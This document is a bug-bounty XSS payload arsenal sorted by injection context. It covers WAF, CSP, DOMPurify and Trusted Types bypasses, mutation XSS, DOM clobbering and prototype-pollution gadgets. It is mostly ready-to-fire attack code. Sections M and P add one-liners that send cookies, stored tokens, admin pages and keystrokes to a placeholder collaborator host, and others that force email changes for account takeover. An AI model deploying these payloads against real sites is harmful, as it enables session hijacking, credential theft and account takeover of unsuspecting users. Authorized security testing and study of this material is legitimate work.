# XSS Payload Arsenal — Context-Organized, Bug-Bounty Edition

> Companion to `XSS_TESTING_GUIDE.md`. **Pick by context, not at random** — see guide §3.3/§5. Replace `YOUR.oast.fun` with your Collaborator/interactsh/XSS-Hunter host. Use only on authorized targets and exfil only your own test data (guide §38).
>
> **Workflow:** discover with a polyglot (§A) → identify context (guide §5) → switch to the *minimal* context-correct payload (this file) → if blocked, jump to WAF (§G) / CSP (§H) / length (§I) sections.

---

## 0. Decision map — read what came back, then jump to the right section (the "if this → do this")

> Inject the probe **`xss7f3a9'"<>`** , find your marker in the **raw response AND the live DOM**, read the bytes around
> it, and follow the branch. (Full explanation: guide §1.9 fundamentals + §3.4 decision flow.)

```
WHERE did xss7f3a9 land?
  in raw HTML, between tags, < > came back RAW ........ HTML BODY      → §B  (<svg onload=…>)
  in value="xss7f3a9", " came back RAW ................ QUOTED ATTR    → §C  ("><svg onload=…>)
  in value="xss7f3a9", " is &quot; but > is raw ...... ATTR, no quote → §C  (" autofocus onfocus=… x=")
  in value=xss7f3a9 (no quotes) ...................... UNQUOTED ATTR  → §C  (x onmouseover=…)
  in on…="…xss7f3a9…" ................................ JS-IN-ATTR     → §C  (');alert(1)// — entities decode)
  in <script> … "xss7f3a9" … </script> ............... JS STRING      → §D  (";alert(1)//)
  in href="xss7f3a9" ................................. URL            → §E  (javascript:alert(document.domain))
  NOT in raw HTML, only in the live DOM .............. DOM-BASED      → §J  (#<img src=x onerror=…>)
  everything came back ENCODED (&lt; &quot; …) ....... pivot → JS(§D)/URL(§E)/DOM(§J)/CSTI(§K), or bypass below

BLOCKED?  WAF 403/stripped → §G    CSP blocks it → §H    length-limited → §I    sanitizer/DOMPurify → §N
IT FIRED? escalate to IMPACT → §M/§P  (cookie/token theft, HttpOnly-proof ATO via CSRF-token theft, admin context)
```

**Per-character outcomes (inject ONE at a time — full version: guide §3.4.1):**
```
`<` → renders as a REAL tag (e.g. <u>/<br> appears, or a real element in the DOM) = HTML interpreted → §B tags work
`<` → comes back `&lt;`                = HTML-encoded, inert in HTML → PIVOT (test `"` separately! / JS §D / URL §E / DOM §J / CSTI §K)
`<` → raw but as TEXT in <textarea>/<title>/<script>/comment = CLOSE that context first (</textarea>… </script>… -->…)
`<` → STRIPPED                          = blacklist → alternates/mixed-case/nesting <scr<script>ipt> (§G) or move input
`"` → raw in value="…"                  = QUOTED ATTR → "><svg onload=…>          `"` → &quot; = encoded → unquoted-attr handler / pivot
`"` → comes back \"  in <script>         = JS string w/ escaping → inject `\` : \";alert(1)//
`'`/`"` HTML-encoded INSIDE on…="…"      = entities DECODE in event handlers → ');alert(1)// or &#39;);alert(1)//
`>` encoded but `"` raw                  = can't close tag → STAY IN TAG: " autofocus onfocus=alert(1) x="
`(` `)` stripped → alert`1`    space stripped → <svg/onload=…>    `;` gone → "-alert(1)-"    `{}`+framework → CSTI {{…}}
RULE: each char has its own fate — "`<` encoded but `"` raw" is the classic win you'd miss by only sending <script>.
```

---

## A. Discovery polyglots (fire first, see what survives)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1&rpar;"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">

"><svg onload=alert(document.domain)>
'"></textarea></script><svg onload=alert(document.domain)>
javascript:"/*'/*`/*--></noscript></title></style></textarea></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

---

## B. HTML body context (guide §6)

```html
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.domain)//
<body onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
<textarea autofocus onfocus=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<audio src onerror=alert(document.domain)>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
<svg><set onbegin=alert(document.domain) attributeName=x to=y dur=1s>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click
<form><button formaction=javascript:alert(1)>X
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

---

## C. HTML attribute context (guide §7)

```html
<!-- Quoted: break out -->
"><svg onload=alert(document.domain)>
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>

<!-- Quote survives but > is encoded: add an event attribute -->
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" onpointerover=alert(1) x="
' autofocus onfocus=alert(1) x='

<!-- Unquoted attribute -->
x onmouseover=alert(1)
x onfocus=alert(1) autofocus
/onmouseover=alert(1)

<!-- Inside an existing on*="...HERE..." JS-in-attribute (entities work, guide §7.3) -->
');alert(1)//
'-alert(1)-'
&#39;);alert(1)//
&apos;);alert(1)//
```

---

## D. JavaScript context (guide §8)

```javascript
// Inside double-quoted string:  var x = "HERE";
";alert(document.domain)//
";alert(document.domain);//
"-alert(document.domain)-"
"};alert(document.domain);{"

// Inside single-quoted string:  var x = 'HERE';
';alert(document.domain)//
'-alert(document.domain)-'

// Inside template literal:  var x = `HERE`;
${alert(document.domain)}
`+alert(document.domain)+`

// Break the whole <script> element from a JS string (when < > survive):
</script><svg onload=alert(document.domain)>

// Break a JSON object embedded in a script:
"};alert(document.domain);var z={"a":"

// Backslash/escape games:
\";alert(1)//
";alert(1)//
```

---

## E. URL / href / src / javascript: context (guide §9)

```
javascript:alert(document.domain)
javascript:alert(document.domain)//
JaVaScRiPt:alert(1)
javascript:alert(1)
java%0ascript:alert(1)
java%09script:alert(1)
javascript:%61lert(1)
data:text/html,<script>alert(document.domain)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
vbscript:alert(1)
javascript:alert(1)
```

---

## F. CSS / style context (guide §10)

```html
<!-- Break out of style into a tag -->
red"></style><svg onload=alert(1)>
red"><script>alert(1)</script>
```
```css
/* CSS exfil (no JS) of a token, char-by-char — escalate when CSP blocks JS (guide §10/§26) */
input[name="csrf"][value^="a"]{background:url(//YOUR.oast.fun/leak?c=a)}
input[name="csrf"][value^="b"]{background:url(//YOUR.oast.fun/leak?c=b)}
/* iterate the alphabet and grow the prefix to recover the full value */
@import url(//YOUR.oast.fun/x.css);   /* if @import survives */
```

---

## G. WAF / filter bypass (guide §18)

```html
<!-- Case & structure -->
<sCrIpT>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
<svg	onload=alert(1)>            (literal tab between attrs)
<svg
onload=alert(1)>                    (literal newline)

<!-- Encodings (decode-layer mismatch) -->
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
&#x3c;svg onload=alert(1)&#x3e;
<svg onload=&#97;lert(1)>
<svg onload=alert(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Defeat the "alert" signature -->
<img src=x onerror=top['ale'+'rt'](1)>
<img src=x onerror=window['al'+'ert'](1)>
<svg onload=top[8680439..toString(30)](1)>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
<svg onload=Function('aler'+'t(1)')()>

<!-- No parentheses (when ( ) filtered) -->
<svg onload=alert`1`>
<img src=x onerror=alert`document.domain`>
<svg onload="window.onerror=alert;throw 1">

<!-- No spaces -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Comment / control-char splitting -->
<img src=x onerror=alert(1)//
<scri<script>pt>alert(1)</scri</script>pt>   (nested-tag re-assembly vs naive stripping)
```

```
Strategy reminders (guide §18.3):
- Move the payload to a DIFFERENT injection point (header / JSON body / path) the WAF may not inspect.
- DOM XSS via #fragment is never sent to the server → bypasses the WAF entirely (guide §11).
- Double-encode or mix encodings to survive one normalization pass.
```

---

## H. CSP bypass (guide §19)

```html
<!-- unsafe-inline present → inline just runs -->
<svg onload=alert(document.domain)>

<!-- Allow-listed CDN hosts AngularJS/library → CSTI/script-gadget executes -->
<div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
<script src="//allowed-cdn.example/angular.min.js"></script>

<!-- JSONP on an allow-listed origin -->
<script src="//allowed.example/api/jsonp?callback=alert"></script>
<script src="//accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>   (illustrative)

<!-- base-uri missing → hijack relative script loads -->
<base href="//YOUR.attacker.tld/">

<!-- 'strict-dynamic' + a reflected/injectable script element -->
<script src="data:text/javascript,alert(1)"></script>   (only if allowed by the gadget chain)

<!-- No-JS exfil when scripts are truly blocked (dangling markup leaks following HTML incl. CSRF token) -->
<img src='//YOUR.oast.fun/leak?h=
<form action='//YOUR.oast.fun/leak'><input name=x value='
```
```
Checklist (paste CSP into csp-evaluator.withgoogle.com):
□ 'unsafe-inline' / 'unsafe-eval' present?           → trivial bypass
□ script-src *  or  https:  or  data:?               → host your script anywhere
□ allow-listed host serves JSONP or a JS framework?  → callback / script-gadget bypass
□ nonce reused / reflected / predictable?            → reuse it
□ missing base-uri / object-src 'none'?              → <base> / <object> vectors
□ Content-Security-Policy-Report-Only?               → DOES NOT BLOCK — full XSS still runs
□ CSP only on main page, absent on an API/subpage?   → inject there
```

---

## I. Length-limited / restricted (guide §21)

```html
<svg onload=alert()>
<svg/onload=alert()>
<a href=//YOUR.tld onclick=alert()>x
<script src=//YOUR.tld></script>
<svg onload=import('//YOUR.tld')>
<base href=//YOUR.tld>                  (then a relative <script src=app.js> loads from you)
<script>eval(name)</script>              (long payload supplied via window.name from launcher page)
```

---

## J. DOM XSS quick tests (guide §11)

```
https://target/page#<img src=x onerror=alert(document.domain)>
https://target/page#<svg onload=alert(document.domain)>
https://target/page?returnUrl=javascript:alert(document.domain)
https://target/page?next=javascript:alert(1)
https://target/#/redirect?url=javascript:alert(1)
```
```javascript
// postMessage XSS (run from an attacker page that frames/open()s the target)
const w = window.open('https://target/widget');
setTimeout(()=>w.postMessage('<img src=x onerror=alert(document.domain)>','*'), 1500);

// window.name source
window.name='<img src=x onerror=alert(1)>'; location='https://target/sink';
```

---

## K. Framework-specific (guide §15)

```
AngularJS (1.x) CSTI — works even when < > are HTML-encoded:
  {{constructor.constructor('alert(document.domain)')()}}
  {{$on.constructor('alert(document.domain)')()}}
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)')}}
  {{[].pop.constructor('alert(1)')()}}

Angular (2+):
  via bypassSecurityTrustHtml / [innerHTML] with a sanitizer gap; trace in the bundle.

Vue:
  v-html sink; template injection: {{constructor.constructor('alert(1)')()}}

React:
  dangerouslySetInnerHTML={{__html: userInput}}  ; href={`javascript:alert(1)`} (test data:/blob:)

Handlebars/Mustache:
  {{{ userInput }}}   (triple-stache renders raw HTML)

jQuery legacy:
  $(location.hash)         (jQuery <1.9)
  $('#'+location.hash.slice(1))
```

---

## L. File-based (guide §16)

```xml
<!-- xss.svg — served inline from app origin = stored XSS -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```
```
Filename payload:        "><img src=x onerror=alert(document.domain)>.png
Markdown link:           [x](javascript:alert(document.domain))
Markdown image:          ![x](javascript:alert(1))
HTML/PDF generator LFI:  <iframe src=file:///etc/passwd></iframe>   (server-side HTML→PDF, guide §16.4)
CSV/formula injection:   =HYPERLINK("//YOUR.oast.fun/?c="&A1,"click")   ;  =cmd|'/c calc'!A1
```

---

## M. Impact one-liners (escalation — guide Part IV; full scripts in `poc/`)

```javascript
// Cookie theft (no HttpOnly) — guide §24
new Image().src='//YOUR.oast.fun/c?'+encodeURIComponent(document.cookie);

// Token / storage theft — guide §25
fetch('//YOUR.oast.fun/t',{method:'POST',mode:'no-cors',body:JSON.stringify({ls:{...localStorage},c:document.cookie})});

// CSRF-token theft → forced email change (HttpOnly-proof ATO) — guide §26
fetch('/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf_token='+document.querySelector('[name=csrf_token]').value+'&email=attacker@evil.tld'});

// Blind beacon (prove WHERE it fired) — guide §13
new Image().src='//YOUR.oast.fun/b?u='+encodeURIComponent(location.href)+'&d='+document.domain+'&t='+encodeURIComponent(document.title);

// External hook load (blind / big payload)
var s=document.createElement('script');s.src='//YOUR.oast.fun/h.js';document.body.appendChild(s);
```

---

## N. Sanitizer / DOMPurify / mutation-XSS (mXSS) bypass — HIGH value (guide §15/§17)

> When output is run through an HTML sanitizer (DOMPurify, sanitize-html, OWASP Java HTML Sanitizer, Ruby Loofah,
> Bleach) the bug is a **parser-roundtrip mismatch**: the sanitizer's parse ≠ the browser's re-parse, so markup
> mutates back into script after cleaning (mXSS). Match the **library + version** (bundle/headers); these are
> representative classes — confirm the exact bypass for the version. Sources: cure53 DOMPurify advisories, PortSwigger
> mXSS research, PayloadsAllTheThings, HackTricks.

```html
<!-- mXSS via namespace confusion (foreignObject / mglyph / annotation-xml) -->
<svg></p><style><a id="</style><img src=1 onerror=alert(document.domain)>">
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<svg><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></svg>
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

<!-- noscript / comment / CDATA re-parse mutations -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<!--><svg onload=alert(1)>-->          <svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>

<!-- attribute / unknown-element survival the sanitizer allowlists -->
<a href="javascript:alert(1)">x</a>        (allowlisted href + bad scheme passthrough)
<template><img src=x onerror=alert(1)></template>
<xmp><img src=x onerror=alert(1)></xmp>

<!-- DOMPurify config gaps you should always probe -->
ALLOWED_URI_REGEXP too loose → javascript:/data: slips
SANITIZE_DOM:false / RETURN_DOM + reinsertion → re-parse mXSS
ADD_TAGS/ADD_ATTR custom allowlist → find an event/handler they forgot
USE_PROFILES:{svg:true} / {mathML:true} → namespace-confusion vectors above
```
> **Method:** sanitized sink → feed each mutation class, view the **post-sanitization DOM** (DevTools), and look for a
> tag/attr that the browser re-interprets as script. mXSS that survives DOMPurify on a major app is a clean **High**
> (often → ATO via §M/§P escalation).

---

## O. Prototype pollution → XSS gadget, and CSP script-gadgets (guide §11/§19)

```javascript
// 1) Client-side prototype pollution that a "gadget" turns into XSS (cross-ref JS-files kit §13)
location.hash = '#__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>'
?__proto__[src]=data:,alert(1)            ?constructor[prototype][onload]=alert(1)
// confirm pollution first:  Object.prototype.polluted   then find the sink-gadget (a lib reading an undefined option)

// 2) Script-gadget CSP bypass — abuse a TRUSTED, allow-listed library already on the page
//    (Google's "CSP Is Dead" research): the gadget reads attacker DOM and executes it.
```
```html
<!-- script gadgets: harmless-looking markup a framework auto-executes (defeats nonce/strict-dynamic) -->
<div data-ng-app ng-csp><div ng-bind-html="x" x="constructor.constructor('alert(1)')()"></div></div>
<div data-controller="..." ...>            (Stimulus/older frameworks auto-instantiate)
<input data-require="alert(1)">            (RequireJS / AMD gadget)
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">   (where allowed)
<!-- jQuery/$.globalEval, Knockout data-bind, Aurelia, Vue v-* — any auto-binding attr is a gadget -->
```
```
JSONP endpoints commonly allow-listed (callback = your code) — confirm the host is in script-src:
  //accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)
  //www.google.com/complete/search?client=chrome&jsonp=alert(1)
  any *.target / CDN endpoint returning  callback(<json>)  → callback=alert(document.domain)
```
> **CSP escalation order:** unsafe-inline → JSONP on an allow-listed host → script-gadget in an allow-listed framework
> → `<base>`/`object-src` gap → nonce reuse → dangling-markup exfil (§H) when scripts are truly blocked.

---

## O2. DOM Clobbering — HTML-only → JS compromise (beats sanitizers; guide §11.7)
```
# DOMPurify/most HTML sanitizers ALLOW id/name → inject named elements to override globals the JS reads:
<a id=x href="javascript:alert(document.domain)">                  # window.x.href
<a id=config><a id=config name=url href="//evil/x.js">            # window.config = collection ; config.url = 2nd el
<form id=cfg><input name=url value="//evil/x.js">                # cfg.url (nested) clobber
<img name=getElementById>                                         # clobber document.getElementById (hijack lookups)
<a id=a><a id=a name=b><a id=a name=b>                            # 3-level a.b chain via HTMLCollection
# find the gadget in the bundle (§15):  document.<x> / window.<x> / `X.url`/`X.src` reads / currentScript / `cfg||{}`
# IMPACT: clobber a config/loader the app trusts → its script.src/innerHTML uses YOUR value → DOM XSS → ATO (§P).
```

## O3. Trusted Types — bypass when `require-trusted-types-for 'script'` is enforced (guide §19.4)
```
# detect: response header  require-trusted-types-for 'script'  + trusted-types <names> ; console "requires TrustedHTML".
# 1) DEFAULT-policy pass-through (the #1 real bypass): if app did
#      trustedTypes.createPolicy('default',{createHTML:s=>s, createScriptURL:s=>s})
#    then EVERY innerHTML/script.src auto-trusts input → normal DOM XSS payloads work.
# 2) reusable NAMED policy whose createHTML returns input ~unchanged → route payload through it.
# 3) enforcement gaps: CSP is report-only, OR TT header missing on the API/subframe that reflects → no enforcement.
# 4) non-TT sinks still fire:  location='javascript:alert(document.domain)'  (navigation, not a TT-guarded sink)
# 5) mXSS THROUGH the policy (§N): a mutation re-introduces script after createHTML sanitizes → bypass.
```

---

## P. Impact escalation — ATO & persistence one-liners (guide Part IV; scripts in `poc/`)

> Prove the **highest** impact your context allows, on **your own** test account, then stop. (guide §24–§27)

```javascript
// Account takeover via password / email change (CSRF-token auto-stolen from the page)
fetch('/api/account',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json',
 'X-CSRF-Token':document.querySelector('[name=csrf]')?.value||''},
 body:JSON.stringify({email:'attacker@evil.tld'})}).then(_=>new Image().src='//YOUR.oast.fun/ato-done');

// Steal an API key / bearer token rendered or stored in the app
new Image().src='//YOUR.oast.fun/k?'+encodeURIComponent(localStorage.token||document.body.innerText.match(/[A-Za-z0-9_\-]{20,}/)?.[0]);

// Read another-origin secret IF a permissive CORS exists (chain to CORS kit)
fetch('https://api.target/me',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('//YOUR.oast.fun/me',d));

// Persistence: register a service worker (survives navigation; intercepts requests) — own account, remove after
navigator.serviceWorker.register('//YOUR.oast.fun/sw.js',{scope:'/'});

// Self-propagating action / admin function call (if the victim is admin)
fetch('/admin/users',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('//YOUR.oast.fun/admin',d));

// Keylogger beacon (demonstration only, own session)
document.onkeypress=e=>new Image().src='//YOUR.oast.fun/k?'+e.key;
```
> The bounty payload is **ATO / secret theft / admin action**, not `alert(1)`. Stored/blind XSS hitting an **admin or
> support** session (CSP-free internal panel) is the classic Critical — escalate to an admin action and prove it safely.

---

## Q. Real-world critical XSS chains & CVE classes (guide §15/§17/§22)

```
□ DOMPurify bypasses (cure53) — periodic mXSS bypasses via SVG/MathML namespace confusion & template re-parse.
   Match the bundled DOMPurify version; many apps pin an old vulnerable one. (→ stored XSS → ATO.)
□ AngularJS sandbox escapes (1.x, all versions post-1.6 sandbox removed) — CSTI {{constructor.constructor(...)()}}
   anywhere ng-app applies → XSS even with < > HTML-encoded (§K).
□ React dangerouslySetInnerHTML + a bad sanitizer, or href={userInput} with javascript:/data: → XSS.
□ Vue v-html / template compilation of user input → XSS; Vue 2 vs 3 differences.
□ jQuery <1.9 $(location.hash) / $.parseHTML auto-execution; jQuery-ui, Bootstrap data-* gadgets.
□ Markdown renderers (marked/markdown-it) with html:true → raw HTML → XSS; image/link javascript: schemes.
□ SVG uploaded & served inline from app origin → stored XSS (cross-ref FileUpload kit §13).
□ Prototype-pollution gadget chains in lodash/jQuery/$.extend → DOM XSS (§O; JS-files kit §13).
□ PostMessage handlers with no origin check writing to innerHTML → cross-origin DOM XSS (JS-files kit §12).
□ Cache-poisoned / Host-header reflected XSS served to all users (Host-Header kit §10/§12) → mass stored XSS.
□ Self-XSS + CSRF or + request smuggling → victim-delivered XSS (turns "self" into a real finding).
```
> **References:** PortSwigger XSS & mXSS research + cheat sheet (`portswigger.net/web-security/cross-site-scripting`,
> `/research`), PayloadsAllTheThings *XSS Injection*, HackTricks *XSS*, cure53 DOMPurify, Google "CSP Is Dead, Long Live
> CSP" (script gadgets), Hackviser & PentesterLab XSS modules, OWASP XSS Filter-Evasion Cheat Sheet.

---

> Keep this file as a quick-reference. The reasoning behind *which* payload to use, and how to turn any of these into a paying report, is in `XSS_TESTING_GUIDE.md`. Minimal, context-correct payloads make the best PoCs (guide §38).
